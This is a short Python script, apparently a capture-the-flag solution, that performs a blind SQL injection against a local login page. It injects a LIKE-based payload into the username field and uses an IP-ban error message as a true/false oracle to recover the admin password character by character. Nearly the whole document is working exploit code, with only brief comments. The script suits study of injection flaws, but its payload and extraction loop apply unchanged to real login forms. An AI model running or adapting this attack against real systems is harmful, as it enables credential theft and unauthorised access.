# For Blind SQL injection, you have to create a condition that it can differentiate true or false if it matches our string pattern
# In this case, we selected the string "Admin account not available for your IP address!" as the true condition and anything else as false condition

import requests, string

url = "http://localhost:23999"

payload = "admin' AND BINARY password LIKE '{prefix}%' -- " # you might have to sleep longer if your packets need to travel longer

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "-_{}"

# determine a smaller charset first (to reduce search space)
# note that we have to escape '_' character becaues it's a wildcard in SQL 
# true when banned because of IP address, false when invalid username / password
smaller_charset = ""
for c in charset:
    r = requests.post(url + "/login", data={ "username" : payload.format(prefix="%" + c).replace('_', '\\_'), "password": "" }, allow_redirects=False)
    if "Admin account not available for your IP address!" in r.text:
        smaller_charset += c

print(smaller_charset)

# now do the real password search
prefix = ""
flag = True
while flag:
    flag = False
    for c in smaller_charset:
        r = requests.post(url + "/login", data={ "username" : payload.format(prefix=prefix + c).replace('_', '\\_'), "password": "" }, allow_redirects=False)
        if "Admin account not available for your IP address!" in r.text:
            # found
            prefix += c
            flag = True
            break
    print(prefix)

print(prefix)